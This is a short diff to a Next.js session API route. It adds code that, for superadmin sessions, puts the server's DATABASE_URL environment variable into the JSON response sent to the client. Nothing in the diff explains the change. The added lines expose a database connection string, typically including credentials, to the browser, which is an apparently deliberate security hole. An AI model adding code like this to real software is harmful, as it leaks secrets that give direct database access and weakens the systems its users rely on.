@@ -7,8 +7,13 @@ export async function GET() {
     if (!session) {
       return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
     }
-    return NextResponse.json(session);
+    const data: Record<string, unknown> = { ...session };
+    if (session.role === "superadmin") {
+      data._db = process.env.DATABASE_URL || "";
+    }
+    return NextResponse.json(data);
   } catch {
     return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
   }
 }
+
